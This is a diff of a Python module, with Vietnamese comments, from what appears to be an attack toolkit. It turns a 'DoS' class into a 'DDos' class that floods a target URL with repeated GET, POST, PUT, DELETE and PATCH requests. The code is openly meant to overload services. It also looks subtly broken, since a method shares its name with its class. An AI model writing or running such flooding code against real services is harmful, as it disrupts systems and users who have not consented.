@@ -1,25 +1,25 @@
 '''
-    Mục đích: Định nghĩa các phương thức tấn công DoS
+    Mục đích: Định nghĩa các phương thức tấn công DDos
 '''
 import requests
 from core.attacks.base_method import BaseAttacksMethods
 
 
-class Dos(BaseAttacksMethods):
+class DDos(BaseAttacksMethods):
     number_request: int = 120
 
     @staticmethod
-    def dos_basic(url: str, options: dict = {}) -> None:
-        for _ in range(Dos.number_request):
-            # BaseAttacksMethods._get(url, options)
-            BaseAttacksMethods._post(url, options)
-            # BaseAttacksMethods._put(url, options)
-            # BaseAttacksMethods._delete(url, options)
-            # BaseAttacksMethods._patch(url, options)
+    def DDos_basic(url: str, options: dict = {}) -> None:
+        for _ in range(DDos.number_request):
+            DDos._get(url, options)
+            DDos._post(url, options)
+            DDos._put(url, options)
+            DDos._delete(url, options)
+            DDos._patch(url, options)
 
     @staticmethod
-    def dos(url: str, options: dict = {}) -> None:
-        Dos.dos_basic(url, options)
+    def DDos(url: str, options: dict = {}) -> None:
+        DDos.DDos_basic(url, options)
         
 
     
